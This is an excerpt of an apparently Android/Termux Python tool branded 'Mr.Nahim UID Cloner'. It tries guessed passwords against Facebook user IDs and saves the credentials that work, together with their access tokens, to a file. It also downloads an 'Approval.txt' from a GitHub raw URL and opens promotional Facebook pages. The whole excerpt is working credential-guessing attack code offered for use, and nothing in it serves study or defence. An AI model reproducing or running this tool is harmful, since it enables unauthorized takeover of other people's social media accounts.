...
def notice():
	...
	runtxt("\033[0;92m BYPASS ADMIN FACEBOOK PAGE >> https://www.facebook.com/profile.php?id=100077031805521")
	runtxt("\033[0;95m    <===================☠️  \033[0;97mEXIT\033[0;95m ☠️===================> ")
	subprocess.check_output(["am", "start", "https://www.facebook.com/N1H8M"])
...
class Main:
	def __init__(self):
		...
		runtxt("\n    \033[0;92m <=======     𝐌𝐫.𝐍𝐚𝐡𝐢𝐦 𝐔𝐈𝐃 𝐂𝐋𝐎𝐍𝐄𝐑    =======>  \033[0;97m ")
	...
	def v2(self):
		if	os.path.isfile('.v2.py'):
			...
			os.system("pip install requests && pip install bs4 && clear && wget https://raw.githubusercontent.com/Nahim404/paid404/main/Approval.txt")

		else:
			os.system("pkg install wget -y")
			os.system("wget https://raw.githubusercontent.com/Nahim404/paid404/main/Approval.txt")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [𝐌𝐫.𝐍𝐚𝐡𝐢𝐦] : %s/%s -> \033[0;92m [ BY-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [𝐌𝐫.𝐍𝐚𝐡𝐢𝐦-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [𝐌𝐫.𝐍𝐚𝐡𝐢𝐦-CP] %s | %s\033[0;97m         "%(uid, pw))
